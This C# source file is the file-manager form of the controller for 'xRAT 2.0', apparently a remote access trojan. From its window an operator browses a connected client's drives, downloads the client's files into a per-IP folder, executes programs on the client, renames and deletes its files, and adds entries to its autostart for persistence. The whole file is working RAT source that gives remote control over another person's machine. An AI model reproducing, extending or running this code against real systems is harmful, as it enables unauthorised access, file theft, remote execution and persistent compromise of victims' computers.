using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using xServer.Core;
using xServer.Core.Misc;

namespace xServer.Forms
{
    public partial class FrmFileManager : Form
    {
        private string _currentDir;
        private readonly Client _connectClient;
        private readonly ListViewColumnSorter _lvwColumnSorter;

        public FrmFileManager(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmFm = this;
            InitializeComponent();

            _lvwColumnSorter = new ListViewColumnSorter();
            lstDirectory.ListViewItemSorter = _lvwColumnSorter;
        }

        private void FrmFileManager_Load(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                this.Text = string.Format("xRAT 2.0 - File Manager [{0}:{1}]",
                    _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
                new Core.Packets.ServerPackets.Drives().Execute(_connectClient);
            }
        }

        private void FrmFileManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_connectClient.Value != null)
                _connectClient.Value.FrmFm = null;
        }

        private void cmbDrives_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                if (_connectClient.Value != null)
                {
                    if (_connectClient.Value.LastDirectorySeen)
                    {
                        _currentDir = cmbDrives.Items[cmbDrives.SelectedIndex].ToString();
                        new Core.Packets.ServerPackets.Directory(_currentDir).Execute(_connectClient);
                        _connectClient.Value.LastDirectorySeen = false;
                    }
                }
            }
        }

        private void lstDirectory_DoubleClick(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                if (lstDirectory.SelectedItems.Count != 0)
                {
                    if (lstDirectory.SelectedItems[0].Tag.ToString() == "dir" && _connectClient.Value != null)
                    {
                        if (lstDirectory.SelectedItems[0].SubItems[0].Text == "..")
                        {
                            if (_currentDir.EndsWith(@"\"))
                                _currentDir = _currentDir.Remove(_currentDir.Length - 1);

                            if (_currentDir.Length > 2)
                                _currentDir = _currentDir.Remove(_currentDir.LastIndexOf(@"\", StringComparison.Ordinal));

                            if (!_currentDir.EndsWith(@"\"))
                                _currentDir = _currentDir + @"\";

                            new Core.Packets.ServerPackets.Directory(_currentDir).Execute(_connectClient);
                            _connectClient.Value.LastDirectorySeen = false;
                        }
                        else
                        {
                            if (_connectClient.Value.LastDirectorySeen)
                            {
                                if (_currentDir.EndsWith(@"\"))
                                    _currentDir += lstDirectory.SelectedItems[0].SubItems[0].Text;
                                else
                                    _currentDir += @"\" + lstDirectory.SelectedItems[0].SubItems[0].Text;

                                new Core.Packets.ServerPackets.Directory(_currentDir).Execute(_connectClient);
                                _connectClient.Value.LastDirectorySeen = false;
                            }
                        }
                    }
                }
            }
        }

        private void ctxtDownload_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                if (files.Tag.ToString() == "file")
                {
                    string path = _currentDir;
                    if (path.EndsWith(@"\"))
                        path += files.SubItems[0].Text;
                    else
                        path += @"\" + files.SubItems[0].Text;

                    int ID = new Random().Next(int.MinValue, int.MaxValue - 1337) + files.Index; // ;)

                    if (_connectClient != null)
                    {
                        new Core.Packets.ServerPackets.DownloadFile(path, ID).Execute(_connectClient);

                        this.Invoke((MethodInvoker) delegate
                        {
                            ListViewItem lvi =
                                new ListViewItem(new string[] {ID.ToString(), "Downloading...", files.SubItems[0].Text});
                            lstTransfers.Items.Add(lvi);
                        });
                    }
                }
            }
        }

        private void ctxtExecute_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                if (files.Tag.ToString() == "file")
                {
                    string path = _currentDir;
                    if (path.EndsWith(@"\"))
                        path += files.SubItems[0].Text;
                    else
                        path += @"\" + files.SubItems[0].Text;

                    if (_connectClient != null)
                        new Core.Packets.ServerPackets.StartProcess(path).Execute(_connectClient);
                }
            }
        }

        private void ctxtRename_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                if (files.SubItems[0].Text != "..")
                {
                    string path = _currentDir;
                    string newName = files.SubItems[0].Text;
                    bool isDir = files.Tag.ToString() == "dir";

                    if (path.EndsWith(@"\"))
                        path += files.SubItems[0].Text;
                    else
                        path += @"\" + files.SubItems[0].Text;

                    if (InputBox.Show("New name", "Enter new name:", ref newName) == DialogResult.OK)
                    {
                        if (_currentDir.EndsWith(@"\"))
                            newName = _currentDir + newName;
                        else
                            newName = _currentDir + @"\" + newName;

                        if (_connectClient != null)
                            new Core.Packets.ServerPackets.Rename(path, newName, isDir).Execute(_connectClient);
                    }
                }
            }
        }

        private void ctxtDelete_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                if (files.SubItems[0].Text != "..")
                {
                    string path = _currentDir;
                    bool isDir = files.Tag.ToString() == "dir";
                    string text = string.Format("Are you sure you want to delete this {0}",
                        (isDir) ? "directory?" : "file?");

                    if (path.EndsWith(@"\"))
                        path += files.SubItems[0].Text;
                    else
                        path += @"\" + files.SubItems[0].Text;

                    if (MessageBox.Show(text, "Are you sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Question) ==
                        DialogResult.Yes)
                    {
                        if (_connectClient != null)
                            new Core.Packets.ServerPackets.Delete(path, isDir).Execute(_connectClient);
                    }
                }
            }
        }

        private void ctxtAddToAutostart_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                if (files.Tag.ToString() == "file")
                {
                    string path = _currentDir;
                    if (path.EndsWith(@"\"))
                        path += files.SubItems[0].Text;
                    else
                        path += @"\" + files.SubItems[0].Text;

                    using (var frm = new FrmAddToAutostart(path))
                    {
                        if (frm.ShowDialog() == DialogResult.OK)
                        {
                            if (_connectClient != null)
                                new Core.Packets.ServerPackets.AddStartupItem(AutostartItem.Name, AutostartItem.Path,
                                    AutostartItem.Type).Execute(_connectClient);
                        }
                    }
                }
            }
        }

        private void ctxtRefresh_Click(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                new Core.Packets.ServerPackets.Directory(_currentDir).Execute(_connectClient);
                _connectClient.Value.LastDirectorySeen = false;
            }
        }

        private void btnOpenDLFolder_Click(object sender, EventArgs e)
        {
            string downloadPath = Path.Combine(Application.StartupPath,
                "Clients\\" + _connectClient.EndPoint.Address.ToString());

            if (Directory.Exists(downloadPath))
                Process.Start(downloadPath);
            else
                MessageBox.Show("No files downloaded yet!", "xRAT 2.0 - File Manager", MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
        }

        private void ctxtCancel_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem transfer in lstTransfers.SelectedItems)
            {
                if (!transfer.SubItems[1].Text.StartsWith("Downloading")) return;
                if (_connectClient != null)
                    new Core.Packets.ServerPackets.DownloadFileCanceled(int.Parse(transfer.Text)).Execute(_connectClient);
            }
        }

        private void lstDirectory_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // Determine if clicked column is already the column that is being sorted.
            if (e.Column == _lvwColumnSorter.SortColumn)
            {
                // Reverse the current sort direction for this column.
                if (_lvwColumnSorter.Order == SortOrder.Ascending)
                    _lvwColumnSorter.Order = SortOrder.Descending;
                else
                    _lvwColumnSorter.Order = SortOrder.Ascending;
            }
            else
            {
                // Set the column number that is to be sorted; default to ascending.
                _lvwColumnSorter.SortColumn = e.Column;
                _lvwColumnSorter.Order = SortOrder.Ascending;
            }

            // Perform the sort with these new sort options.
            lstDirectory.Sort();
        }
    }
}